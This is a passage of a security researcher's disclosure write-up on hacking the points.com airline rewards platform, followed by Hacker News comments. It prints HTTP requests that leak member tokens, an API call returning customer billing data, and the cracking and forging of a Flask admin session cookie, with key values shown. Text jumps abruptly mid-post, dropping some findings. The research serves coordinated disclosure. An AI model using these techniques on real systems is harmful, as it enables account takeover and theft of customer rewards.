seats.aero, expressing my interest in finding vulnerabilities in the rewards program infrastructure. After chatting for a while, we then pulled in Shubham Shah, another another hacker who has been hunting on airlines for years, and started a group chat with the goal of finding security vulnerabilities affecting the rewards points ecosystem. When we began our research, we found that a company called points.com was the provider for nearly all major rewards programs globally. Every airline that I'd ever flown had used points.com as their backend for storing and processing reward points. They seemed to be the leader in the space, and they even had a security.txt page on their website. How does it all work? After searching through Github and reading points.com documentation for a few hours, we found that there was an API built for rewards programs to use running on the \"lcp.points.com\" website. While looking through public repositories, we found a link to what looked like API documentation for the \"lcp.points.com\" API that had since been removed from the internet. Luckily for us, there was a copy of it available on archive.org. The archived API documentation described ways in which reward programs could authenticate users, reward loyalty points, transfer loyalty points, spend loyalty points, and much more. Our initial thought here was \"how do we get access to use the API on behalf of a rewards program?\", and after exploring a bit, we found the \"console.points.com\" website which allowed public registration for rewards programs to create skeleton accounts that had to be manually approved. After authenticating to this portal, we observed that it was an administration console for the rewards programs where they could initialize and manage OAuth-type apps. The apps were provisioned API keys that interacted with the \"LCP API\" (short for \"Loyalty Commerce Platform\") which was the \"lcp.points.com\" host. The next thing we did was examine the JavaScript that powered the dashboard. We discovered that the website \"console.points.com\" appeared to be utilized by points.com employees for executing administrative actions concerning customer accounts, rewards programs, and managing components of the website itself. The rewards program API used by rewards programs to manage points and customer accounts (lcp.points.com) required two keys to interact with it, both of which were distributed when you registered to the console.points.com website: macKeyIdentifier: essentially an OAuth client_id macKey: essentially an OAuth client_secret Using the above two variables that we obtain by registering an app on \"console.points.com\", we were able to sign HTTP requests to the \"lcp.points.com\" host via the OAuth 2.0 MAC authentication scheme and call the loyalty platform API. The fact that the platform employed this form of authorization was somewhat frustrating as it both meant we'd have to write a wrapper for signing HTTP requests to fuzz the API and that the secret key wouldn't be included in HTTP requests sent by the rewards programs. If we found a vulnerability like SSRF on an airline program, for example, the key itself would not be leaked to us, only the signature for the specific HTTP request that the airline was trying to make. We fuzzed the API for a long time (manually signing each HTTP request using a Python script) and failed to find any one-off authorization vulnerabilities. It was trivial to find the numeric IDs of other airline programs, but unfortunately we were unable to find any basic core API vulnerabilities like IDOR or privilege escalation. We decided to change routes to better understand how the publicly listed customer rewards programs were using the points.com infrastructure. Exploring the United Airlines Points Management Website Since United Airlines was leveraging points.com for their rewards program, we thought it would be interesting to test one of their apps that was integrated with points.com. We found the following MileagePlus domain which was used to buy, transfer, and manage MileagePlus miles: https://buymiles.mileageplus.com/united/united_landing_page/#/en-US After fuzzing the site for a little while, we soon realized that the \"buymiles.mileageplus.com\" website was actually hosted by points.com and not United Airlines. We became super curious how the website worked from an authorization perspective and began to test the intended functionality of the site. We continued using the \"buymiles.mileageplus.com\" website normally and observed the following flow after attempting to buy miles: Click \"Buy miles\" on the \"buymiles.mileageplus.com\" website Observe you are redirected to \"www.united.com\" where we authenticate to an OAuth-type flow using our United MileagePlus username and password Observe you are redirected via the \"redirect_uri\" parameter to \"buymiles.mileageplus.com\" which then sends the following HTTP request using the authorization token obtained from authenticating with our username and password on \"www.united.com\": HTTP Request POST /mileage-plus/sessions/sso HTTP/2 Host: buymiles.mileageplus.com Content-Type: application/json {\"mvUrl\":\"www_united_com_auth_token\"} HTTP Response HTTP/2 201 Created Content-type: application/json {\"memberValidation\": \"points_com_user_auth_token\"} Using the returned \"memberValidation\" token from the above HTTP response, send another HTTP request to the following endpoint where \"memberDetails\" is the returned \"memberValidation\" token: HTTP Request POST /payments/authentications/ HTTP/2 Host: buymiles.mileageplus.com Content-Type: application/json {\"currency\":\"USD\",\"memberDetails\":\"points_com_user_auth_token\",\"transactionType\":\"buy_storefront\"} HTTP Response HTTP/201 Created Content-type: application/json {\"email\": \"example@gmail.com\", \"firstName\": \"Samuel\", \"lastName\": \"Curry\", \"memberId\": \"EH123456\"} After completing the OAuth-type flow, it appeared that the \"memberValidation\" token acted as a user authorization token for the points.com airline tenant whereby we could use this token repeatedly to perform API calls and authenticate as a user. If we could generate this token for another user, we would be able to perform actions on their account like transferring airline miles and retrieving their personal information. This became one of our goals as we learned more about how the airline website was leveraging the points.com infrastructure, and something we explored further. (1) Improper Authorization on Points Recipient Endpoint Allows Attacker to Authenticate as Any User Using Only Surname and Rewards Number As we continued to look for issues which would allow us to leak someone's \"memberValidation\" token, one flow we found on the United website titled \"Buy miles for someone else\". When you landed on this page as an authenticated MileagePlus user, it would ask you to add a recipient to send miles to. The recipient input field took in a first name, last name, and a MileagePlus number. When we sent the HTTP request to add the recipient, we noticed something super interesting returned in the response: HTTP Request POST /mileage-plus/mvs/recipient HTTP/2 Host: buymiles.mileageplus.com Content-Type: application/json {\"mvPayload\":{\"identifyingFactors\":{\"firstName\":\"Victim\",\"lastName\":\"Victim\",\"memberId\":\"EH123456\"}},\"lpId\":\"loyalty_program_uuid\"} HTTP Response HTTP/2 201 Created Content-type: application/json {\"memberId\": \"EH123456\", \"links\": {\"self\": {\"href\": \"points_com_user_auth_token\"}}, \"membershipLevel\": \"1\"} The HTTP response contained the member's authorization token, something that we previously learned is used to retrieve their information and transfer miles on their behalf! The vulnerability worked like this: by sending their first name, last name, and rewards number through the normal website UI for adding a points recipient, the server would return an authorization token in the HTTP response which could be used to retrieve their billing address, phone number, email, redacted credit card information, and billing history. We could additionally transfer miles on their behalf using this token. To use the leaked token, we could simply take it and plug it into any of the API calls on the website and perform actions like transferring miles or simply retrieving the member's PII. We were able to fully authenticate into the victim account by only knowing their surname and rewards point number! Escalating the issue to affect other rewards programs At this point, after discovering it was possible to access customer accounts knowing only their surname and rewards number, we were curious if there were other endpoints on the \"buymiles.mileageplus.com\" site that had similar permission issues but didn't require us to know any prerequisite information about the customer (our bug felt very lame at this time). We noticed that there was a parameter present in the original vulnerable HTTP request for generating member authorization tokens called \"lpId''. According to the LCP API documentation, this parameter referred to the loyalty program UUID (e.g. Delta, United, Southwest, etc.). It appeared that the API on United's website was hitting the same API which other programs like Delta or Emirates used. We were able to validate that we could exploit this vulnerability to access other rewards program customer accounts by swapping the loyalty program UUID and user rewards number to that of another program from our first vulnerability. If we swapped the loyalty UUID and rewards number to a Delta customer, it would return the authorization token a victim within the different rewards program. Interestingly, this behavior also demonstrated that this was hitting a universal points.com API which seemed to be connected to all loyalty programs versus only United Airlines. After escalating the issue to generating authorization tokens for any airline, we began to fuzz the vulnerable HTTP request and soon realized that the loyalty program UUID parameter was being sent as an HTTP path argument to a proxied HTTP server. We discovered this by observing strange behavior when appending a question mark and pound symbol at the end of the loyalty program ID parameter, breaking the HTTP request being sent by the server: HTTP Request POST /mileage-plus-transfer/mvs/recipient HTTP/1.1 Host: buymiles.mileageplus.com {\"mvPayload\":{},\"lpId\":\"0ccbb8ee-5129-44dd-9f66-a79eb853da73**#**\"} : [curl options...] \" % os.path.basename(__file__)) Using code from the above Github repository built to help sign HTTP requests to \"lcp.points.com\", we could use the following syntax to send Virgin signed HTTP requests to the \"lcp.points.com\" API: python lcp_curl.py -u MAC_ID:MAC_SECRET \"https://lcp.points.com/v1/search/orders/?limit=1000\" After running the above script to sign an HTTP request on behalf of the Virgin program to \"/v1/search/orders\" endpoint, we received the following data back: { \"orders\": [ { \"payment\": { \"billingInfo\": { \"cardName\": \"Visa\", \"cardNumber\": \"XXXXXXXXXXXXXXXX\", \"cardType\": \"VISA\", \"city\": \"REDACTED\", \"country\": \"US\", \"expirationMonth\": 4, \"expirationYear\": 2023, \"firstName\": \"REDACTED\", \"lastName\": \"REDACTED\", \"phone\": \"REDACTED\", \"state\": \"CA\", \"street1\": \"REDACTED\", \"zip\": \"REDACTED\" } ... ], \"totalCount\": \"2032431\" } It worked! This validated that the leaked credentials were valid and could be used to access the Virgin rewards program. An attacker could hit any of the \"lcp.points.com\" endpoints using these credentials, including administrative ones like adding/removing rewards points from customers, accessing customer accounts, and modifying tenant information related to the Virgin rewards program. We reported the issue and the endpoint was removed within an hour. (4) Authorization Bypass on \"widgets.unitedmileageplus.com\" allows Attacker to Authenticate as Any User via Last Name and Rewards Number, Potential Access to United MileagePlus Administration Panel On the United bug bounty program, there are a few domains that are explicitly out of scope including \"mileageplus.com\". Our guess why they're out of scope is that many of the \"mileageplus.com\" subdomains are actually powered by points.com. One of the subdomains of this site is \"widgets.unitedmileageplus.com\" which acts as a sort of SSO service for United MileagePlus members to authenticate into apps like \"buymiles.mileageplus.com\" and \"mpxadmin.unitedmileageplus.com\". After enumerating the subdomain with gau, we identified that there were various login pages that would authenticate you into related MileagePlus apps. Each of these login pages expected different arguments: some would ask you for a United MileagePlus number and password, while others would ask you for a username, password, and an answer to your security questions. There was one very odd form, where it only asked you for your MileagePlus number and last name. We found that the token returned from each of the different authorization methods were identical in format to each other. We tested and found that it was possible to copy the token from the HTTP response where you authenticated using only your surname and MileagePlus number into the consumer endpoints from the more secure username, password, and security question endpoints and you would be authenticated into any of the applications! This meant that there was an authorization bypass where we could skip logging into the account with the member credentials and instead only provide their name and MileagePlus number. From an impact perspective, there were various apps that were accessible via this bypass including the \"buymiles.mileageplus.com\" which disclosed PII and allowed us to transfer miles to ourselves. We went ahead and used this exploit to transfer miles from one of our own accounts to another, demonstrating that it was indeed possible to transfer another user's miles using this authorization bypass. The other much more interesting app that we could've (potentially) authenticated to was the \"mpxadmin.unitedmileageplus.com\" website. We were unable to confirm this because at the time of discovering the issue we didn't have the surname and a MileagePlus number of a United employee who may have had access to the app. If we did, we assume that it would've been possible and this level of access would allow us to manage the balances of customers, view transactions, and perform administrative actions for the MileagePlus rewards program. Since we couldn't confirm this, the hunt continued! Looking for something more critical… The holy grail for us would be the ability to generate unlimited miles. We'd never be able to actually exploit it (ethically), but just the idea of finding a way to travel the world with free first class flights, five star hotels, cruises, and meals kept us going... (what our fantasy world looked like, given that we could discover a vulnerability to generate unlimited rewards points) Switching Back to Hunting on the Points.com Global Administration Console After realizing that we couldn't go much further impact wise hunting on the airline websites, we switched our focus back to the original website we found that was used by points.com employees and rewards program owners to administratively manage their customers and rewards programs. From what we saw in the JavaScript on the \"console.points.com\" website, there were tons of endpoints that were only accessible to points.com employees. We tested these endpoints for a few more hours, trying and failing to find any sort of authorization bypass or way around the permission checks. After a little while longer of frustrated attempts to escalate our privileges, we zoomed out and realized something obvious that we had been overlooking the entire time... (5) Full Access to Core Points.com Administration Console and Loyalty Admin Website via Weak Flask Session Secret After we finally stopped testing the APIs and looking for permission vulnerabilities, we realized that we'd totally forgotten to look at the session cookies! Based on the format of the cookie, we could tell that it was some weird encrypted blob because on the JWT-looking format of it. It took us a little more poking but we eventually realized that the core app session token was a signed Flask session cookie. session=.eJwNyTEOgzAMBdC7eO6QGNskXCZKrG8hgVqJdEPcvX3ru6n5vKJ9PwfetFHCiCqwtYopo4NLiPOo4jYMuhizpJLV8oicilQF_qOeF_a104taXJg7bdHPiecHfX8ccg.ZFCriA.99lOhq3pO8yBWM7XjBshaKjqPKU We took the cookie and ran it through Ian Carroll's \"cookiemonster\" tool. This tool would automatically guess secrets used for signing the cookie by attempting to unsign it with a wordlist of known secrets. After a few seconds, we had a response! zlz@htp ~> cookiemonster -cookie \".eJwNyTEOgzAMBdC7eO6QGNskXCZKrG8hgVqJdEPcvX3ru6n5vKJ9PwfetFHCiCqwtYopo4NLiPOo4jYMuhizpJLV8oicilQF_qOeF_a104taXJg7bdHPiecHfX8ccg.ZFCriA.99lOhq3pO8yBWM7XjBshaKjqPKU\" 🍪 CookieMonster 1.4.0 ℹ CookieMonster loaded the default wordlist; it has 38919 entries. ✅ Success! I discovered the key for this cookie with the flask decoder; it is \"secret\". The Flask session secret for the website that was used by points.com employees to manage all rewards profiles, loyalty programs, and customer orders, was the word \"secret\". We could now theoretically sign our own cookie with whatever data we wanted, as long as the server wasn't including some unpredictable or signed piece of data within the cookie. We authenticated to the website and copied our session cookie over to flask-unsign to investigate the contents of the cookie: {\"_csrf_token\": \"redacted\", \"_fresh\": true, \"_id\": \"redacted\", \"_user_id\": \"redacted\", \"sid\": \"redacted\", \"user\": {\"authenticationType\": \"account\", \"email\": \"samwcurry@gmail.com\", \"feature_flags\": [\"temp_resending_emails\"], \"groups\": [], \"id\": \"redacted\", \"mac_key\": \"redacted\", \"mac_key_identifier\": \"redacted\", \"roles\": []}} Based on what we saw in the decrypted body of our cookie, there wasn't anything unpredictable that would stop us from tampering with the cookie. The \"roles\" and \"groups\" arrays appeared most fruitful for escalating privileges since we could now re-sign it with any data we wanted, so we went back through the app and attempted to find JavaScript which related to these fields. The role which looked the most privileged based on the information we found in the JavaScript was the \"configeditor\" role. We added this to our cookie along with the \"admin\" group and resigned it using the following command: flask-unsign -s -S \"secret\" -c \"{'_csrf_token': 'bb2cf0e85b20f13dcfebecb436c91b160f392fa2555961c23b3fcc67775edc50', '_fresh': True, '_id': 'a76abcdda16ed36f131df6e5f30c7e9cf142131ebcd4c0706b4c05ec720006daeaef804fcd925743954f10c8a5b3e10018216585157c88e6aedaa8fb42702dd3', '_user_id': '8547961e-b122-4b42-a124-4169cfc86a94', 'sid': 'bd2e7256bf1011eda2410242ac11000a', 'user': {'authenticationType': 'account', 'email': 'samwcurry@gmail.com', 'feature_flags': ['temp_resending_emails', 'v2_manual_bonus_page', 'v2_request_for_reimbursements'], 'groups': ['admin'], 'id': '8547961e-b122-4b42-a124-4169cfc86a94', 'mac_key': 'blLWTn1VyhIWNPoAVC2X9-Iqsqei7pEPkgXjxnhRepg=', 'mac_key_identifier': '8d261003b476497e8be4c2c077d69b5f', 'roles': [{'role': 'https://lcp.points.com/v1/roles/configeditor'}]}}\" The command resigned our cookie with the \"secret\" key and gave us the following cookie: session=.eJy9U01r3DAU_C8-x1lJ1oe9UOgSegiUsrQhCZRg9PG0665tOZKcdgn5733eHAKFQLeHniw_zcwbzZOei9am6NscDjAW68IYZj2BWhhGPK2c9WDAGl5J21BDJfFVw7xmQohGUssqU3lrpVJKgLOCFBdF6yOkfbHOcQb86xzKaiW1sc5pKsFVEpWp8xKEr4hV0FhPOcMaIIZboog0-BFgFSOESKdBg68J99Y1TCheNYJ7SmythamAEkJrRqWoBRXK1jVIDU7r2hvOFGHOVYutOUF8dVMLrtA9lIYyVnJElZoyXnIq0YqtpW44MtIJbBwDxYQ02JBS1GWcEsaZthQbE43ARblYPxd6znsYc2d17sJ4c5xgObq1YR4zwmDQXY-VpIefdo7x-HEK3ZjTpQ0DbnvQeY7Q-l7vUrH-XmQYphazhNF146490RMCn1g76HHWfWvCOKd20jt4LUd4nCHl1oeI624wc0wwoKVUPFwUuxjm6aR8FcYUetikba8zgoeNG7pxwZyTz6Bte4DjklH_-e5mpLfH_fXdl23Y3F6x-6a8fkyP0Knp0_awu__xa9x_hWn34Y2Iw1jS8t2SXlE7JjHQynAleaOgNsAtw8ugnGyM8MiL6Hnx_3xaIWef85TWq1Vvp8u3LFdPdHWCriJoV4axPxYvF39NeiecMxS2p9pmmr7N0xRiPoerp6lM59P6f2LZOeUwQPx_HQcdD5DxOuOTeeosJBtG3-0gpnNUTAgH1IiwtF-G_Af_vRE-vLz8BnvIpoE.ZFDJgQ.Lld9KeetbZJ_KBeLI2KOHB7EnaA After plugging this cookie in, we attempted to revisit the \"console.points.com\" website and saw a bunch of extra functionality. We were in and had full administrative privileges! One page that immediately grabbed our attention was \"Manual Bonus\". After clicking it, we realized that it was capable of manually adding rewards points for any program to any rewards account. Jackpot! We could additionally access the \"admin-loyaltywallet.points.com\" website after clicking the \"Loyalty Platform\" sidebar button. This website had additional functionality, allowing us to query users via their name, member ID, or email address, and much much more: Other tabs included config and experiment management: Another fun bit of impact was the ability to modify the rewards exchange amounts through the Promos tab. We could update rewards programs to offer, for example, 100 million United miles in exchange for 1 Delta mile, or simply 1 million miles for every dollar spent on a particular program. Users would then be able to exchange their miles, giving them nearly unlimited miles. For user management, you could view, update, or delete user accounts. It was possible to see all account history, connections, and memberships for the accounts. Two other interesting pages on the \"console.points.com\" website were the Modules and Routes endpoints. An attacker could use this as intended to add malicious JavaScript to every page on the administration panel. If undetected, it would make for a super fun backdoor where an attacker's JavaScript would be loaded on every page of the administration website. Since these were all production rewards customers, an attacker could temporarily shut down all rewards travel by modifying the key pairs used by each airline on the Platform Partners endpoint. Once the MAC ID and MAC key were overwritten, it would break the infrastructure used by airlines to communicate with points.com, meaning customers would be unable to book flights using airline miles. Something important to note is that this administration panel was built for points.com employees to manage rewards programs at the tenant level. An attacker with this level of access could revoke the credentials used by the actual airline to provide service to their customers to access the API, thereby shutting down global rewards travel for that specific airline. In addition to accessing customer account information. There are many interesting scenarios in which a malicious attacker could've abused this access. We reported the vulnerability and the points.com team responded almost immediately, even though our email was sent at 3:26 AM CST (sorry for hacking so late, both Ian and I were restless on a plane when we found this vulnerability!). The team understood the severity of the report and immediately took down the \"console.points.com\" website. We attempted to bypass their fix via vhost hopping from the origin server IP with no luck. The site was completely taken down and the issue would be fixed shortly after. Closing After submitting our last report to the points.com team, the overall findings had allowed us to access to customer information for a huge percentage of global rewards programs, transfer points on behalf of customers, and finally access the global administration panel. We had reported all issues to the points.com security team who very quickly patched them and worked with us in creating this disclosure. This blog post, along with our other research (taking over a dozen TLDs; being able to remotely unlock, locate, and sometimes disable over a dozen different auto manufacturers vehicles) follows the theme of high impact vulnerability research where an attacker can compromise a single point of failure with widespread impact. Thank you for reading! :P Disclosure Timeline March 8, 2023 - Reported Miles Theft and PII Disclosure Vulnerability (#1) March 8, 2023 - Response from points.com acknowledging the issue March 9, 2023 - Sent additional information on how to escalate March 8th finding (#2) March 9, 2023 - Response from points.com, site taken offline March 29, 2023 - Received email from points.com about regarding a comprehensive fix March 29, 2023 - Sent response validating the comprehensive fix April 29, 2023 - Reported United Authorization Bypass (#3) April 29, 2023 - Response from points.com, site taken offline May 2, 2023 - Sent report for leaked Virgin credentials (#4) May 2, 2023 - Response from points.com, endpoint removed May 2, 2023 - Sent report for Weak Flask Session Cookie (#5) May 2, 2023 - Response from points.com, site taken offline August 3, 2023 - Disclosure Special thanks to... Nick Wright for the amazing cover image (https://instagram.com/nick99w) Daniel Ritter (https://twitter.com/_danritter) Brett Buerhaus (https://twitter.com/bbuerhaus) Samuel Erb (https://twitter.com/erbbysam) Joseph Thacker (https://twitter.com/rez0__) Gal Nagli (https://twitter.com/naglinagli) Noah Pearson Find me on:twitter: https://twitter.com/samwcyodiscord: zlz",
    "commentLink": "https://news.ycombinator.com/item?id=41232446",
    "commentBody": "Hacking the largest airline and hotel rewards platform (2023) (samcurry.net)260 points by DavidChouinard 13 hours agohidepastfavorite90 comments alwa 13 hours agoI’m really impressed at the number of times they say their counterparts responded to their report in under an hour, immediately took the affected site offline, then resolved the issue quickly. That seems like an enviable operation. reply joatmon-snoo 13 hours agoparentSeriously! I actually can’t think of any openly documented security incident with such impressive remediation timelines. There’s a lot that has to go into fixing things on such a tight timeline too: - oncall-level alerting for your security.txt inbox - your oncall needs to either be someone who can actually take corrective action on the system in question (not easy in a large company!) or able to route the issue to the right team - the service owners need to be empowered to treat security with the appropriate severity (taking the site down so quickly speaks highly to this) Hats off to the points.com team. With any luck, this post doesn’t get too much traction and y’all won’t get flooded with bounty beggar spam. reply michaelt 10 hours agorootparent> - oncall-level alerting for your security.txt inbox Maybe the terminology is different in your company, but my employer has an 'operations' team which has several shifts of workers, who look after things that need 24/7 monitoring. They then triage and escalate as appropriate. That's who you'd have monitoring the security inbox, if you want round-the-clock monitoring, so nobody's getting woken several times a night by spam. reply remus 10 hours agoparentprevIt's a strange disconnect between the quality of the incident response and the extremely basic nature of many of the bugs reported. I mean SECRET_KEY='secret'?! Seriously straightforward stuff. reply toyg 9 hours agorootparentWhy? One depends on development practices, the other on security-team practices. You can have a team of donkeys building a product and the sharpest hackers guarding it. Ideally best practices would trickle down, but that's not a given. reply remus 6 hours agorootparent> You can have a team of donkeys building a product and the sharpest hackers guarding it. You could do but it's a pretty risky way to run a business. Obviously the real world often gets in the way, but a competent manager would look at that org structure and say \"shouldn't we move some of those smart ppl on to the build team to catch issues before they're in prod? Seems awfully risky waiting until it's live to catch these bugs which could cause us massive financial harm\" reply jmb99 5 hours agorootparentFrom experience, a lot of talent security people really just don’t want to be developers, even if they’re good at it. It’s not always as simple as shuffling people around between teams. reply udev4096 6 hours agorootparentprevWhy would anyone even use such a predictable word for dev environment? I am baffled by this practice of not following the bare minimum security mindset even when you are just running it in a dev environment reply fragmede 4 hours agorootparentBecause it's dev. Does your bathroom door have a deadbolt and a key and you lock it firmly every single time when you're home alone? reply Normal_gaussian 2 hours agorootparentWhilst you are being facetious, deadbolting a bathroom door is really really dangerous. Bathrooms have a high risk of life threatening accidents and any locks should be bypassable indicators - this is why most have a coin unlock on the outside. Many countries have regulations requiring bathrooms to be unlockable from the outside without a key, and the external doors to be unlockable from the inside without a key. Deadbolting a bathroom is also pointless - there is nothing ti protect. Using an effective password for dev environments is sensible; it holds no risk of meaningful loss and can prevent compromise due to a common mistake. reply mywacaday 2 hours agorootparentprevI don't know if points.com was a startup at some stage with a build fast fix later attitude, I wonder if a lot of startups are in the same boat. reply TrackerFF 11 hours agoparentprevMakes me wonder if they (points.com) have some key-word alerts on incoming emails. I know for sure that at some companies, this would have taken hours (to days!) to detect, if the tip had come through a regular info@ or contact@ inbox. reply bakje 10 hours agorootparentThe article mentions a security.txt[1] which doesn't seem to contain an email address but it does contain a link[2] to a disclosure program, I'm guessing that's how they submitted all their findings? [1] https://www.points.com/.well-known/security.txt [2] https://bugcrowd.com/plusgrade-vdp-pro reply diggan 1 hour agoparentprevIt seems they reacted before the team even sent over a report in one case: > Before we could even finish sending our report or see if other endpoints were accessible (e.g. adding points to a customer rewards account), the points.com team had detected our testing and had completely shut down United's production points.com website. Bummer! reply jollofricepeas 13 hours agoparentprevYou almost have to pull the site to stroke bounty hunter egos when you could just push a change to prod instead. If not, they are quick to bash you publicly. There’s too much hubris in the “professional” web app bug hunter community. Generally, their attitude is very “look at these stupid developers,” “developers suck at security,” or “a conspiracy is happening because company X didn’t take their app down within 10 minutes of getting my email.” It’s much more nuanced than that. I’d like to see: 1) more bounties and better paid bounties 2) less ego and much more professionalism and patience from “researchers” Both would be better for consumers. reply hansvm 12 hours agorootparent> when you could just push a change to prod instead. I wonder if there's an attack vector hiding where you induce a malicious bug via an illegitimate bounty and the developers' bias against inaction. reply Thorrez 5 hours agorootparentHow about this one: https://hackerone.com/reports/745324 It's a $20k bounty for simply taking a cookie that a HackerOne employee accidentally pasted when responding to a different vuln report on HackerOne. reply azeirah 11 hours agorootparentprev100%, hacking is as much technical prowess as it is social engineering. reply sangeeth96 10 hours agoprevI've always felt most such rewards program portals and apps were more hack-jobs than serious applications and thus, would be riddled with issues like these. I'm from India and I see many of these sites come and go all the time but not a single one has inspired confidence in me about keeping my data safe. For example, even the topmost cards here (HDFC Diners/Infinia) have a shoddy website, mostly a reskinned version of their generic rewards platform/partner. And I'm not just hand-waving here cause there are many forums that discuss taking advantage of their bad implementations to maximize returns. Even when one eventually gets patched, another springs up. reply grecy 9 hours agoparent> I've always felt most such rewards program portals and apps were more hack-jobs than serious applications It’s easy to figure out which way any system goes. Does it generate revenue or cost money? The former will be a serious application, the latter a hack job reply kredd 3 hours agorootparentJust did a mental test of this theory through past projects I’ve consulted for, and it seemed the opposite. I’ve seen hack jobs generating about $1M/day, as a second product of the company. And seen very mature serious applications barely breaking even. reply bogtog 8 hours agoprevIs taking the website offline really necessary? If the vulnerability has been there for 1 year or so already, what harm does it being there for 1 year and an hour do? Also, maybe it's not clear to me exactly what is getting taken down, but I'm amazed that the chain from \"person reading email\" to \"person that is permitted to take down the website\" moves so quickly (or that the latter right is given so low in the hierarchy). reply simondotau 8 hours agoparentGiven the real money involved, keeping it online with this flaw in place isn’t an option. reply dewey 8 hours agorootparentIt is a very real option. If it's not being exploited by hundreds of people right now and you make more money keeping the site up vs. what you lose in \"fraud\" it makes sense to keep it running. Just like you don't shut down your store if someone stole some merchandise or how credit cards just factor fraud into the fees. reply shakna 8 hours agorootparentIt's often a violation of both government laws and insurance contracts, if you knowingly expose that much financial information to a proven vulnerability. There are businesses where if you suffer a theft, you shut everything down and run a stocktake. For example, an arms dealer. And there are times credit card providers shut down - because there is a known vulnerability, and they have to immediately mitigate, or lose their insurance. reply jessriedel 5 hours agorootparentOk, but shutting down the website because of legal/moral responsibility to protect customer info is very different than doing so because of the “real money involved”, which is what commenter dewey was responding to. You can choose to just take the fraud cost hit in the latter case. reply tehryanx 5 hours agorootparentprevI don't think this is a good analogy. It's more like you find that the lock on your stores front door has been broken for a long time and you just hadn't noticed. Nobody has broken in yet, but could at any moment. Also, it's not just your goods and business that are at risk, instead you're responsible for the protection of things that belong to other people. reply fragmede 4 hours agorootparentprevThe optimal amount of fraud is non-zero. https://www.bitsaboutmoney.com/archive/optimal-amount-of-fra... reply junto 13 hours agoprev> On May 2nd, 2023, we identified that the Flask session secret for the points.com global administration website used to manage all airline tenant and customer accounts was the word \"secret\". After discovering this vulnerability, we were able to resign our session cookies with full super administrator permissions. Seriously? reply xnorswap 11 hours agoparentThis is way more common than you'd like, here's a scenario where it can happen even without outright incompetence: Someone (or some AI) copies an example auth implementation from stackoverflow. Being sensible they realise they shouldn't put key material in source code either, so they leave \"secret\" in place, and pop a ticket in JIRA to update with the key material from the vault before it goes live. Employee falls ill, everything gets re-assigned. Leaves before it gets actioned and that ticket slips through the cracks, with the person taking over their duties not realising how serious \"J10243: Populate secret from key vault\" actually is, perhaps assuming it's currently coming from a different configuration location. There's little chance that the regular testing are discovering the flaw as the key gen based on \"secret\" goes live. reply teractiveodular 9 hours agorootparentThen imagine how often this happens without the \"sensible employee\" and \"pop a ticket in JIRA\" parts. reply bankcust08385 11 hours agorootparentprevTragedy of the Commons often happens where there are too many developers and unclear functional or concerns ownership. Each concern needs a home, a checklist, a runbook, documentation, a support escalation path, and responsible tech or business owners. reply toyg 9 hours agorootparentYou are redefining \"tragedy of the commons\" there... TOTC is about overusing shared resources (e.g. too many people helping themselves to a shared plate of food), not about confusing who should do what. reply astura 4 hours agorootparentprevYou should actually read Garrett Hardin's influential essay you are referencing before referencing it again. It's freely available from his estate at https://www.garretthardinsociety.org/articles/art_tragedy_of... Because it doesn't say what you seem to think it does. reply qingcharles 21 minutes agoparentprevWhen I was in my greyhat days I gained admin access[0] to a very big IIS web hosting provider. After spending a day trawling through their file system I found the actual admin password for their servers in a file. I tested it via their open RDP port. It worked. Their password? \"internet\" I sent them an email showing them their vulns. I never followed up to see if they did anything about it. [0] they had a forum that allowed profile pic uploads but it didn't check they were images, so I crafted an ASP page which emulated a file explorer and uploaded that, then browsed to it. reply samsonradu 10 hours agoparentprevAlso why would anyone store and read data like { 'groups': [...] } on the client-side? Session cookies are supposed to be identifiers only, with the data stored server-side. reply ddorian43 10 hours agorootparentBy default sessions in Flask are stored in plaintext: > This is implemented on top of cookies for you and signs the cookies cryptographically. What this means is that the user could look at the contents of your cookie but not modify it, unless they know the secret key used for signing. reply shakna 9 hours agorootparentThat's precisely why the cookie should just be an identifier, that you look up group info from the database. Because you can guarantee the cookie contents will be modified by someone at some point. Make it useful to you, useless to them. reply ddorian43 9 hours agorootparentBy default flask doesnt have a db. There is flask-sessions extensiom that does this for you. reply shakna 8 hours agorootparentOr you can just link to a DB directly. A Flask app is just a WSGI app. You can mount and extend it with any kind of Python, no extension necessary. reply ddorian43 8 hours agorootparentThat's what the extension does for you. reply samsonradu 6 hours agorootparentprevCan't session data be stored on disk? that's the default PHP behavior. reply ddorian43 6 hours agorootparentBecause you might have multiple webservers. reply samsonradu 6 hours agorootparentThere are solutions for that: Shared NAS, sticky sessions etc. reply ddorian43 5 hours agorootparentGood luck with maintaining that NAS. Your sticky sessions will logout all users on a server that goes down. It's better to have a db. Please stop. reply samsonradu 5 hours agorootparentOf course it's better to have a db doh... I'm replying to your > By default flask doesnt have a db. reply ddorian43 5 hours agorootparentPeople don't have NAS laying around. And don't use a filesystem as a db, especially a remote filesystem. reply ddorian43 9 hours agorootparentprevThe cookie contents can be changed only if you know the secret config. reply shakna 8 hours agorootparentOr if you can bruteforce the secret, or if there's a vulnerability in the secret, or if... You're relying on the fact that the cryptography will be impregnable, rather than adopting an actual security posture. Do not trust the data you send to a user, to remain secure. reply ddorian43 8 hours agorootparentAnd you're relying on security through obscurity. reply shakna 8 hours agorootparentNo. It's relying on both cryptography, and the inaccessiblity of information. Which is a tried, practiced, and often federally mandated, method of security. Controlling who has access to information is sorta security 101. Don't dump your database to the Internet. Security through obscurity is allowing REST commands to the /totallysecretaddress/neverleaked/ URI. reply switch007 8 hours agoparentprevMakes you wonder if there a colleague who wanted to use Django with the biggest \"I told you so\" grin right now reply 8organicbits 2 hours agorootparentFor anyone unfamiliar with Django: > django-admin startproject automatically adds a randomly-generated SECRET_KEY to each new project https://docs.djangoproject.com/en/dev/ref/settings/#secret-k... reply switch007 54 minutes agorootparentAnd stores session data in the DB by default reply sqs 13 hours agoprevImpressively fast responses from Points.com! reply xyst 3 hours agoprevIt’s amazing to me that these well known attack vectors are still possible today. Reading about directory traversal in 2023-2024 is like a blast from the past. reply soygem 31 minutes agoprevThe image is a probably an img2imgd pepe dealer :) reply n4r9 10 hours agoprevDoes anyone know what sort of market share points.com has in this space? It's always interesting to spot correlations between market fragility and a lack of competition (as in the case of the recent Crowdstrike and CDK Global outages). reply openplatypus 10 hours agoprevThe secret was \"secret\". reply Banditoz 2 hours agoprevAnyone know of other blogs similar to Sam Curry's web API exploitation stuff? reply 486sx33 8 hours agoprevIs this why / when airmiles when bankrupt and get bought out at the 11th hour by BMO? https://newsroom.bmo.com/2023-03-10-BMO-Confirms-Agreement-t... reply Marsymars 5 hours agoparentThere was nothing abrupt about the Air Miles bankruptcy, they'd been in long-term decline and had lost nearly all of their major partners by that point. I called the BMO purchase months before it happened. 